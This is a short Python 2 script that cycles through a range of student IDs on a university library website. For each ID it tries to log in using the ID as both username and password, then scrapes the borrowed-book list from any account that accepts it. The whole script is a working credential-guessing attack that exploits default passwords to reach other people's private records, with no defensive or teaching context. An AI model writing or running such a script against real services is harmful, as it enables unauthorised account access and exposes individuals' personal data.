#_*_coding=utf-8_*_
import urllib
import urllib2
import cookielib
import requests
from bs4 import BeautifulSoup
import re

count=99
while count:
    cookie=cookielib.CookieJar()
    hander=urllib2.HTTPCookieProcessor(cookie)
    opener=urllib2.build_opener(hander)
    urllib2.install_opener(opener)
    
    xuehao='MG13220'+str(count)
    
    url='http://book.njulib.cn/smarty_lib/control/controller.php?control=control_log&action=user_login&user_id=MG1422005&us'
    postdata={
    'user_id':xuehao,
    'user_pwd':xuehao}
    postdata=urllib.urlencode(postdata)
    req=urllib2.Request(url,data=postdata)
    login_r=opener.open(req)
    print login_r.read() ,xuehao
  

    
    url2='http://book.njulib.cn/book_lst.php'
    result=opener.open(url2)
    aa=result.read()
    b=re.findall(r'[0-9]" target="_self">(.*?)</a></li>',aa)
    num=len(b)
    for i in range(0,(num-1)):  
        print b[i].decode('utf-8')

    count=count-1
    print '##########################'
